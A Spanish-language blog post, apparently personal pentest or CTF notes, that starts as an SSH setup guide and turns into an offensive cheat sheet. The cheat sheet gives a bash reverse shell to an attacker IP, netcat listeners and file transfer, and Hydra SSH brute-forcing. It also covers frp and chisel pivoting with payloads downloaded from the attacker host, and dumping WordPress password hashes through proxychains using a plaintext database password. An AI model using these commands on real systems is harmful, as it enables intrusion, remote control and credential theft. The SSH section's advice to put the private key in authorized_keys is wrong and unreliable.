---
layout: post
author: Sergio Salgado
---

# [](#header-1)Como establecer una conexion remota SSH?

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
- <a href="#about_ssh">Que es SSH?</a>
- <a href="#instalacion">Instalacion</a>
- <a href="#configuracion">Configuracion</a>
- <a href="#conexion">Establecer conexion</a>
- <a href="#conclusiones">Conclusiones</a>

## [](#header-2)<a id="introduccion">Introduccion</a>
Es incomodo utilizar la terminal desde algunos dispositivos, o simplemente la interfaz no es como a la que estamos acostumbrados. En este post mostrare como configurar correctamente el servicio de SSH para poder establecer una conexion remota desde otro dispositivo.


## [](#header-2)<a id="about_ssh">Que es SSH?</a>


## [](#header-2)<a id="about_ssh">Instalacion</a>


Para dispositivos con sistema operativo basado en debian


```s
#Actualizacion de sistema
sudo apt update && upgrade
#Instalacion de openssh
apt install openssh
#Para loggearte en una maquina con ssh en ejecusion donde el puerto por default es (22):
ssh user@hostname_or_ip
```

Para dispositivos <a id="andorid">android</a>

```S
pkg upgrade
pkg install openssh
```

## [](#header-2)<a id="about_ssh">Configuracion</a>

Por default la contrasena esta establecida, por lo que ingresaremos a verla con
PrintMotd yes
PasswordAuthentication yes
Subsystem sftp /data/data/com.termux/files/usr/libexec/sftp-server

Para establecer una nueva contrasena


```S
$ passwd
New password:
Retype new password:
New password was successfully set.

```

## [](#header-2)<a id="conexion">Establecer conexion</a>
Para saber el usuario de la maquina donde nos conectaremos

```S
$ whoami
```


```S
#Para usar un puerto en especifico
ssh -p 8022 user@hostname_or_ip
```

Tambien es posible crear en la maquina servifor un archivo dentro de /.ssh/ que se llame authorized_keys, jabra que copiarle la llave privada y asignarle el codigo de permisos 600. La llave se copia dentro de algun directorio de la maquina que se conectara con el nombre de id_rsa y se le pasara el siguiente comando:

```s
#Para uso de llave privada y publica
ssh -i id_rsa user@hostname_or_ip
```

Si hemos olvidado la contrasena e intentamos hacer un bruteforce al servicio de ssh mediante wordlist, podemos usar hydra de la manera siguiente:

```s
hydra -s 22 ssh://192.168.0.100 -L users -P wordlist
```

## [](#header-2)<a id="conclusiones">Conclusiones</a>
Es necesario utilizar muchos dispositivos para alguien que se dedica a la tecnologia, por lo que lo mas practico seria utilizar solo una maquina para poder comunicarnos entre los dispositivos y poder configurarlos.


# [](#header-1)Como hacer una reverse shell?
El comando siguiente hara una peticion de conexion para la ip y puerto asignado:

 ```bash
 #Para ejecutar del lado de la victima
bash -i >& /dev/tcp/10.10.14.22/443 0>&1
```

Ahora solo hara falta ponerse en escucha con netcat y para que funcione mejor la consola suelo usar tambien el rlwrap 

```s
rlwrap nc -nlvp 443
```

## [](#header-2)<a id="tratamiento tty">Tratamiento para la tty </a>

Para hacer una shell iteractiva:

```s
script /dev/null -c bash
```

Ctrl+Z

```s
stty raw -echo; fg
#ENTER
reset xterm

export TERM=xterm
export SHELL=bash
```

Para las filas

```s
#Consulta de tamano
stty size
45  174
#Para definir
stty rows 45 columns 174
```

# [](#header-1)Envio de datos mediante netcat

```s
#Maquina que envia
nc 10.10.14.22 443 < file_encrypt
#Maquina que recibe
nc -nlvp 4444 > file
```

# [](#header-1)Proxis
frp
Primero iniciamos en la maquina atacante el servidor, en esta ocasion usaremos la configuracion de default
nohup ./frps -p 7000 &

Despues hacemos cambios en el archivo frpc.ini, cambiando la IP del servidor a la del atacante. Los descargamos a la maquina victima y ejecutamos
chmod +x frpc
nohup ./frpc -c frpc_1.ini &

Chisel
Vamos a usar una herramienta llamada <a href="https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz">chisel</a> para hacer el port forwarding con el contenedor que tenemos enfrente y esta permitido para usarlo en el OSCP.

Asi que lo primero seria descomprimirlo, luego quitarle peso con upx y abrir nuestro servidor http con python para descargarlo del otro lado. 

Y al final desde el contenedor ejecutamos:

```s
curl http://10.10.14.29/chisel_1.7.7_linux_amd64 > chisel
#Le damos permisos
chmod +x chisel

./chisel client 10.10.14.29:1234 R:socks
```

Del lado de la atacante

```s
./chisel server --reverse -p 1234
```

Una vez establecida la comunicacion, hacemos una modificacion en el archivo /etc/proxychains.conf
Agregamos la siguiente linea:

```s
socks5 127.0.0.1 1080
```

Y ahora configuramos el foxyproxy con socks5, puerto 127.0.0.1 y puerto 1080 para poder llegar a estas maquinas desde el navegador.

![104](/assets/images/Toby/104_access.png)

Tambien podemos intentar romper el cifrado de las contrasenas de la DB que teniamos.

Accedemos a la base de datos con:

```SQL
proxychains mysql -uroot -pOnlyTheBestSecretsGoInShellScripts -h 172.69.0.102

show databases;

show tables;

describe wp_users;

select user_login,user_pass from wp_users;
```

Existe una pagina en linea que genera payloads, la cual es: <a href="https://www.revshells.com/"></a>